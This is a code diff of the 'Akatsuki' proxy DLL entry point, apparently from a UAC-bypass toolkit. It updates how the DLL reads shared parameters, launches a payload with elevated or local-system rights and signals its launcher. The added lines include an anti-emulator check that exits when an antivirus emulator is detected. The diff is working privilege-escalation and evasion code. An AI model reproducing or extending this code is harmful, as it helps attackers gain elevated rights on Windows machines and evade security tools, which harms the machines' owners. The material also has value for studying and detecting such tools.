@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2017
+*  (C) COPYRIGHT AUTHORS, 2016 - 2019
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     2.80
+*  VERSION:     3.17
 *
-*  DATE:        07 Sept 2017
+*  DATE:        20 Mar 2019
 *
 *  Proxy dll entry point, Akatsuki.
 *  Special dll for wow64 logger method.
@@ -23,31 +23,15 @@
 #error ANSI build is not supported
 #endif
 
-//disable nonmeaningful warnings.
-#pragma warning(disable: 4005) // macro redefinition
-#pragma warning(disable: 4055) // %s : from data pointer %s to function pointer %s
-#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
-#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
-#pragma warning(disable: 6102) // Using %s from failed function call at line %u
-
-#include <windows.h>
-#include "shared\ntos.h"
-#include <ntstatus.h>
-#include "shared\minirtl.h"
-#include "shared\util.h"
-
-#if (_MSC_VER >= 1900) 
-#ifdef _DEBUG
-#pragma comment(lib, "vcruntimed.lib")
-#pragma comment(lib, "ucrtd.lib")
-#else
-#pragma comment(lib, "libvcruntime.lib")
-#endif
-#endif
+#include "shared\shared.h"
+#include "shared\libinc.h"
 
 #define LoadedMsg      TEXT("Akatsuki lock and loaded")
 
 HANDLE g_SyncMutant = NULL;
+
+UACME_PARAM_BLOCK g_SharedParams;
+
 
 /*
 * DummyFunc
@@ -69,7 +53,7 @@ VOID WINAPI DummyFunc(
 *
 * Purpose:
 *
-* TBD.
+* Dump runtime info to the file, this routine is only for debug builds.
 *
 */
 VOID DbgDumpRuntimeInfo()
@@ -119,37 +103,49 @@ VOID DefaultPayload(
     VOID
 )
 {
-    BOOL bIsLocalSystem = FALSE, bReadSuccess;
-    PWSTR lpParameter = NULL;
-    ULONG cbParameter = 0L;
-    ULONG SessionId = 0;
+    BOOL bSharedParamsReadOk;
+    UINT ExitCode;
+    PWSTR lpParameter;
+    ULONG cbParameter;
+
+    BOOL bIsLocalSystem = FALSE;
+    ULONG SessionId;
 
     if (ucmCreateSyncMutant(&g_SyncMutant) == STATUS_OBJECT_NAME_COLLISION)
         ExitProcess(0);
 
+    //
+    // Read shared params block.
+    //
+    RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
+    bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
+    if (bSharedParamsReadOk) {
+        lpParameter = g_SharedParams.szParameter;
+        cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
+        SessionId = g_SharedParams.SessionId;
+    }
+    else {
+        lpParameter = NULL;
+        cbParameter = 0UL;
+        SessionId = 0;
+    }
+
     ucmIsLocalSystem(&bIsLocalSystem);
 
-    bReadSuccess = ucmReadParameters(
-        &lpParameter,
-        &cbParameter,
-        NULL,
-        &SessionId,
-        bIsLocalSystem);
-
-    ucmLaunchPayload2(
+    ExitCode = (ucmLaunchPayload2(
         bIsLocalSystem, 
         SessionId, 
         lpParameter, 
-        cbParameter);
+        cbParameter) != FALSE);
 
-    if (bReadSuccess) {
-        RtlFreeHeap(
-            NtCurrentPeb()->ProcessHeap,
-            0,
-            lpParameter);
+    //
+    // Notify Akagi.
+    //
+    if (bSharedParamsReadOk) {
+        ucmSetCompletion(g_SharedParams.szSignalObject);
     }
 
-    ExitProcess(0);
+    ExitProcess(ExitCode);
 }
 
 /*
@@ -168,6 +164,9 @@ BOOL WINAPI DllMain(
 {
     UNREFERENCED_PARAMETER(hinstDLL);
     UNREFERENCED_PARAMETER(lpvReserved);
+
+    if (wdIsEmulatorPresent() == STATUS_NEEDS_REMEDIATION)
+        ExitProcess('Foff');
 
     if (fdwReason == DLL_PROCESS_ATTACH) {
         OutputDebugString(LoadedMsg);
